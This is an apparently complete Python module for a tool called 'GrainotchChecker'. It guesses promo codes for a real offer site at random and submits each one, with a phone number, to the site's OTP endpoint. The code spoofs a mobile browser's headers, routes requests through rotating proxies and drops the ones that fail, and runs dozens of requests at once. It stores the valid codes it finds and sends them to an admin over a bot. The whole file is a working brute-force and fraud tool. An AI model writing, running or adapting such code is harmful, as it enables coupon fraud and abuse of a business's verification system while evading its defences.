import asyncio
import aiohttp
import random
import string
import json
import time
import os
from typing import Dict, List, Optional
from proxy_manager import ProxyManager

class GrainotchChecker:
    def __init__(self, proxy_manager: ProxyManager, bot=None, admin_id=None):
        self.proxy_manager = proxy_manager
        self.session = None
        self.running = False
        self.results = []
        self.valid_codes = []
        self.lock = asyncio.Lock()
        self.bot = bot
        self.admin_id = admin_id
        self.storage_file = "valid_codes.json"

    async def get_session(self):
        if self.session is None or self.session.closed:
            self.session = aiohttp.ClientSession()
        return self.session

    async def close(self):
        if self.session and not self.session.closed:
            await self.session.close()

    def generate_code(self) -> str:
        prefix = "BMW"
        chars = string.ascii_uppercase + string.digits
        random_part = ''.join(random.choices(chars, k=7))
        return prefix + random_part

    async def check_code(self, code: str, mobile: str, session: aiohttp.ClientSession) -> Dict:
        url = "https://www.grainotch.theofferclub.in/home/generateOTP"
        headers = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36",
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://www.grainotch.theofferclub.in",
            "Referer": "https://www.grainotch.theofferclub.in/home/register",
            "X-Requested-With": "XMLHttpRequest",
        }
        data = {"phone": mobile, "ccode": code}
        
        proxy = self.proxy_manager.get_proxy() if self.proxy_manager.get_count() > 0 else None
        proxy_dict = self.proxy_manager.get_proxy_dict(proxy) if proxy else None
        
        start_time = time.time()
        try:
            async with session.post(url, data=data, headers=headers, proxy=proxy_dict, timeout=15) as resp:
                response_time = round((time.time() - start_time) * 1000, 2)
                text = await resp.text()
                result = {
                    "code": code,
                    "status_code": resp.status,
                    "response_time_ms": response_time,
                    "raw_response": text,
                    "valid": False,
                    "message": "",
                    "site_status": ""
                }
                if resp.status == 200:
                    try:
                        json_resp = json.loads(text)
                        if json_resp.get("status") == "success":
                            result["valid"] = True
                            result["message"] = "✅ VALID"
                            result["site_status"] = "success"
                        elif json_resp.get("status") == "failure":
                            msg = json_resp.get("msg1") or json_resp.get("msg") or "Unknown"
                            result["message"] = f"❌ {msg}"
                            result["site_status"] = "failure"
                        else:
                            result["message"] = f"❌ Unknown: {json_resp}"
                            result["site_status"] = "unknown"
                    except:
                        result["message"] = "❌ Invalid JSON"
                        result["site_status"] = "parse_error"
                else:
                    result["message"] = f"❌ HTTP {resp.status}"
                    result["site_status"] = f"http_{resp.status}"
                return result
        except Exception as e:
            if proxy:
                self.proxy_manager.mark_bad(proxy)
            return {
                "code": code,
                "status_code": 0,
                "response_time_ms": round((time.time() - start_time) * 1000, 2),
                "raw_response": str(e),
                "valid": False,
                "message": f"❌ Error: {str(e)}",
                "site_status": "error"
            }

    async def _notify_admin(self, code: str, mobile: str):
        """Send valid code to admin immediately."""
        if self.bot and self.admin_id:
            try:
                await self.bot.send_message(
                    self.admin_id,
                    f"🎯 **Valid Code Found!**\nCode: `{code}`\nMobile: `{mobile}`"
                )
            except:
                pass

    async def run_check(self, mobile: str, num_codes: int, concurrency: int = 30):
        self.running = True
        self.results = []
        self.valid_codes = []
        start_time = time.time()
        session = await self.get_session()
        semaphore = asyncio.Semaphore(concurrency)

        async def worker(code):
            async with semaphore:
                result = await self.check_code(code, mobile, session)
                async with self.lock:
                    self.results.append(result)
                    if result["valid"]:
                        self.valid_codes.append(code)
                        # Save to persistent storage
                        await self._save_valid_code(code, mobile)
                        # Notify admin instantly
                        await self._notify_admin(code, mobile)
                return result

        codes = [self.generate_code() for _ in range(num_codes)]
        tasks = [worker(code) for code in codes]
        total = len(tasks)

        # Process in batches to avoid memory overload
        batch_size = 50
        for i in range(0, total, batch_size):
            if not self.running:
                break
            batch = tasks[i:i+batch_size]
            await asyncio.gather(*batch)

        total_time = round(time.time() - start_time, 2)
        await self.close()
        self.running = False
        return {
            "total": len(self.results),
            "valid": len(self.valid_codes),
            "time": total_time,
            "speed": round(len(self.results)/total_time, 1) if total_time > 0 else 0,
            "valid_codes": self.valid_codes
        }

    async def _save_valid_code(self, code: str, mobile: str):
        """Save valid code to JSON file."""
        try:
            if os.path.exists(self.storage_file):
                with open(self.storage_file, "r") as f:
                    data = json.load(f)
            else:
                data = {"codes": []}
            data["codes"].append({"code": code, "mobile": mobile, "timestamp": time.time()})
            with open(self.storage_file, "w") as f:
                json.dump(data, f, indent=2)
        except:
            pass

    def stop(self):
        self.running = False

    @staticmethod
    def get_all_valid_codes() -> List[str]:
        """Return list of all valid codes from storage."""
        try:
            if os.path.exists("valid_codes.json"):
                with open("valid_codes.json", "r") as f:
                    data = json.load(f)
                    return [item["code"] for item in data.get("codes", [])]
            return []
        except:
            return []
